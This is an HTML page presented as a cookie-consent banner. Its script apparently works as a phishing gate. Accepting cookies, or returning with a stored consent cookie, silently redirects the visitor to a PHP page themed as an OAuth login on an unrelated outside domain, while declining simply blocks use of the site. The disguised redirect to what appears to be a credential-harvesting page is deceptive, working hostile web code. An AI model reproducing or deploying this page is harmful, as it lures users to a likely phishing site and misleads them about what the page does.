<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Consent</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .consent-container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h2 {
            margin-bottom: 20px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .accept-btn {
            background-color: #4285f4;
            color: white;
        }
        .accept-btn:hover {
            background-color: #357ae8;
        }
        .decline-btn {
            background-color: #d32f2f;
            color: white;
        }
        .decline-btn:hover {
            background-color: #b71c1c;
        }
    </style>
</head>
<body>
    <div class="consent-container">
        <h2>Cookie Consent</h2>
        <p>This website uses cookies to ensure you get the best experience. Do you accept cookies?</p>
        <button class="accept-btn" onclick="acceptCookies()">Accept Cookies</button>
        <button class="decline-btn" onclick="declineCookies()">Decline Cookies</button>
    </div>

    <script>
        function getCookie(name) {
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i].trim();
                if (cookie.startsWith(name + '=')) {
                    return cookie.substring(name.length + 1);
                }
            }
            return null;
        }

        function createCookie(name, value, days) {
            let expires = "";
            if (days) {
                let date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                expires = "; expires=" + date.toGMTString();
            }
            document.cookie = escape(name) + "=" + escape(value) + expires + "; path=/; Secure";
        }

        function acceptCookies() {
            createCookie("cookieConsent", "accepted", 365);
            window.location.replace("https://amjp.psy-k.org/s-found2/OAuth2.0php.php");
        }

        function declineCookies() {
            alert("Sorry, you cannot use this site without accepting cookies.");
        }

        // Check for cookie consent on page load
        window.onload = function() {
            if (getCookie("cookieConsent") === "accepted") {
                window.location.replace("https://amjp.psy-k.org/s-found2/OAuth2.0php.php");
            }
        };
    </script>
</body>
</html>
